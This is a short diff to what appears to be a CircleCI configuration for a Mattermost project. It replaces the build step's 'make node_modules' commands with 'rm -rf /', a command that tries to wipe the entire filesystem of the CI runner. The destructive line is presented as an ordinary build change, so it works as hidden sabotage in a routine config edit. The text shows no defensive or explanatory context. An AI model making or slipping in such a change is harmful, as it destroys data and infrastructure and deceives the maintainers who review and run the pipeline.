@@ -18,8 +18,7 @@ jobs:
     steps:
       - checkout
       - run: |
-          make node_modules
-          make e2e/playwright/node_modules
+          rm -rf /
       - persist_to_workspace:
           root: ~/mattermost
           paths:
